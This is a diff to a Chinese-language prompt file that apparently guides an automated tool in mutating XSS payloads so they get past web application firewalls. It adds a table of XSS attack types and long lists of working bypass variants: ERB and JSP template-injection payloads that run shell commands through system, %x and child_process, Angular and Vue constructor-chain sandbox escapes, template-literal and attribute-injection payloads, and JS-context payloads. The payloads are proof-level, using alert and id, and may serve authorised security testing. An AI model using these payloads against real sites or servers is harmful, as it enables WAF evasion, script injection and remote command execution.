@@ -4,6 +4,26 @@
 
 基于漏洞语义理解的结果，提出具体的 XSS `part_operations`，通过改变 XSS Payload 的语法表达方式来绕过 WAF，同时保持原始验证目标。
 
+## XSS 攻击类型识别（第一步：读 base_parts 时确定）
+
+根据 `base_parts` 中的 `context_prefix` 和 `label` 判断基础 Payload 属于哪一类 XSS 攻击，你的变异必须**保留同一攻击类别**：
+
+| 攻击类别 | 典型基础 Payload | 识别特征 | 变异空间 |
+|---------|-----------------|---------|---------|
+| **传统 HTML 标签型** | `<script>alert(1)</script>` | 包含 `<tag>` 结构 | 标签替换 + 事件替换 + JS 表达式改写 |
+| **模板注入型（ERB/JSP）** | `<%= system('id') %>` | `<%=` 或 `<%` 开头 | 表达式改写 + 函数替换 + 对象引用 |
+| **模板引擎型（Angular/Vue）** | `{{constructor.constructor('alert(1)')()}}` | `{{` 开头 | 构造器链改写 + 表达式等价 |
+| **JS 模板字面量型** | `${alert(document.domain)}` | `${` 开头 | JS 表达式改写 + 函数替换 |
+| **属性注入型** | `" onload="alert(1)` | 引号 + 事件处理器 | 事件替换 + 表达式改写 + 引号变换 |
+| **纯 JS 上下文型** | `'-alert(1)-'` | 引号包裹的 JS 函数调用 | 函数替换 + 运算符变换 + 字符串操作 |
+
+**判定规则：**
+- 基础 Payload 若含 `<%` → 模板注入类；变异不能删除模板标记。
+- 基础 Payload 若含 `{{` → 模板引擎类；变异保留双花括号结构。
+- 基础 Payload 若含 `${` → JS 模板字面量类；保留模板语法。
+- 基础 Payload 若以引号 + 事件开头 → 属性注入类；保留引号边界。
+- 基础 Payload 若为纯 JS 函数调用（无 HTML） → JS 上下文类；保留函数调用语义。
+
 ## 变异策略层次
 
 变异从浅到深分为 4 个层次，**优先使用深层策略**：
@@ -145,6 +165,94 @@ onerror=alert(1) → onerror=alert&#40;1&#41; （HTML 实体编码）
   <audio onseeking=alert(1) controls src=x>
   <video ondurationchange=alert(1) src=x>
   <audio onvolumechange=alert(1) src=x>
+  ```
+
+### 技术 10：模板注入表达式变换（ERB/JSP）
+- **原理**：改变模板标记内的代码执行方式
+- **适用部件**：javascript_expression（模板注入类）
+- **示例**：
+  ```ruby
+  <%= system('id') %>
+  → <%= `id` %>                                    # 反引号命令执行
+  → <%= exec('id') %>                              # exec 函数
+  → <%= IO.popen('id').read %>                     # IO.popen
+  → <%= %x(id) %>                                  # %x 字面量
+  
+  <%= global.process.mainModule.require('child_process').execSync('id') %>
+  → <%= process.mainModule.require('child_process').exec('id') %>
+  → <%= require('child_process').spawn('id') %>
+  → <%= global.process.binding('spawn_sync').spawn({file:'id',args:[]}) %>
+  ```
+
+### 技术 11：模板引擎构造器链变换（Angular/Vue/Handlebars）
+- **原理**：改变访问 constructor/proto 的路径和方式
+- **适用部件**：javascript_expression（模板引擎类）
+- **示例**：
+  ```javascript
+  {{constructor.constructor('alert(1)')()}}
+  → {{_c.constructor('alert(1)')()}}               # 简写引用
+  → {{$on.constructor('alert(1)')()}}              # Vue $on
+  → {{''.constructor.prototype.charAt=''.constructor.constructor('alert(1)')}}
+  → {{[].constructor.constructor('alert(1)')()}}   # 数组构造器
+  → {{(1).constructor.constructor('alert(1)')()}}  # 数字构造器
+  
+  {{7*7}}                                          # 模板表达式测试
+  → {{[].pop.constructor('alert(1)')()}}
+  → {{x.__proto__.constructor.constructor('alert(1)')()}}
+  → {{this.constructor.constructor('alert(1)')()}}
+  ```
+
+### 技术 12：JS 模板字面量表达式变换
+- **原理**：改变 ${} 内的 JavaScript 表达式
+- **适用部件**：javascript_expression（模板字面量类）
+- **示例**：
+  ```javascript
+  ${alert(document.domain)}
+  → ${prompt(document.domain)}                     # 函数替换
+  → ${confirm(document.domain)}
+  → ${eval('alert(document.domain)')}              # eval 包装
+  → ${Function('alert(document.domain)')()}        # Function 构造器
+  → ${setTimeout('alert(document.domain)')}        # 定时器
+  → ${[].constructor.constructor('alert(document.domain)')()}  # 构造器链
+  → ${window['ale'+'rt'](document.domain)}         # 字符串拼接
+  → ${(alert)(document.domain)}                    # 括号包装
+  → ${self.alert(document.domain)}                 # self 引用
+  ```
+
+### 技术 13：属性注入事件处理器变换
+- **原理**：改变事件类型和引号边界
+- **适用部件**：event_handler, context_prefix（属性注入类）
+- **示例**：
+  ```html
+  " onload="alert(1)
+  → " onerror="alert(1)                            # 事件替换
+  → " onfocus="alert(1)
+  → " onmouseover="alert(1)
+  → ' onload='alert(1)                             # 引号类型变换
+  → " onload=alert(1)                              # 省略引号
+  → " onload="prompt(1)                            # 函数替换
+  → " onload="eval('alert(1)')                     # eval 包装
+  → " onclick="alert(1)
+  → " ontoggle="alert(1)
+  ```
+
+### 技术 14：纯 JS 上下文函数变换
+- **原理**：改变 JavaScript 函数调用方式和运算符
+- **适用部件**：javascript_expression（JS 上下文类）
+- **示例**：
+  ```javascript
+  '-alert(document.domain)-'
+  → '-prompt(document.domain)-'                    # 函数替换
+  → '-confirm(document.domain)-'
+  → '+alert(document.domain)+'                     # 运算符变换
+  → '*alert(document.domain)*'
+  → '/alert(document.domain)/'
+  → '-(alert)(document.domain)-'                   # 括号包装
+  → '-window.alert(document.domain)-'              # window 引用
+  → '-self.alert(document.domain)-'                # self 引用
+  → '-eval("alert(document.domain)")-'             # eval 包装
+  → '-Function("alert(document.domain)")()-'       # Function 构造器
+  → '-(()=>alert(document.domain))()-'             # 箭头函数
   ```
 
 ## 高级攻击 Payload 目录
@@ -314,3 +422,12 @@ onerror=alert(1) → onerror=alert&#40;1&#41; （HTML 实体编码）
 - [ ] 保持了原始验证目标（如弹窗功能）
 - [ ] 没有引入破坏性操作（如窃取 Cookie、重定向）
 - [ ] 优先选择 `available_directions` 中未使用的方向
+- [ ] **保持攻击类别**：变异后的 Payload 必须保留原始攻击类别
+  - 模板注入类（`<%=` / `<%`）→ 保留模板标记，只改变内部表达式
+  - 模板引擎类（`{{`）→ 保留双花括号，改变构造器链或表达式
+  - JS 模板字面量类（`${`）→ 保留 `${}` 结构，改变内部 JS 表达式
+  - 属性注入类（引号 + 事件）→ 保留引号边界和事件结构
+  - 纯 JS 上下文类 → 保留函数调用语义，改变函数或运算符
+- [ ] **非标签型 XSS 不能转换为标签型**：不要把 `{{...}}` 改成 `<script>`，不要把 `${...}` 改成 `<img>`
+- [ ] 与本轮其他候选**在表达式/函数/构造器层面**显著不同
+
